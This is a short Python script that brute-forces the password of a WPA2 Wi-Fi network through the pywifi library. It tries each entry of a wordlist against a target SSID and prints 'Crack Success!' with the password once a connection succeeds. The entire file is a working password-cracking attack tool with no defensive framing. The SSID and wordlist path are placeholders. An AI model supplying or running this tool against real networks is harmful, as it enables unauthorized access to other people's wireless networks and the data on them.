
import argparse
import sys, os, os.path, platform
import time

from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile


ssid = "wifi-name"

filepath = "txt_path"



try:
    wifi = PyWiFi()

    iface = wifi.interfaces()[0]

    iface.scan()
    results = iface.scan_results()


except:
    print('[!] Error system')
    sys.exit(1)


def pwd(ssid, file_path):
    count = 0
    with open(file_path, 'r', encoding='utf8') as words:
        for line in words:
            count += 1
            line = line.split('\n')
            password = line[0]
            main(ssid, password, count)


def main(ssid, password, count):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()
    connect = iface.add_network_profile(profile)
    time.sleep(0.1)
    iface.connect(connect)
    time.sleep(0.5)

    if iface.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print('[*]Crack Success!')
        print("[***] Password is " + password)
        time.sleep(1)
        exit()
    else:
        print(f'[{count}]Crack Failed using {password}')


pwd(ssid, filepath)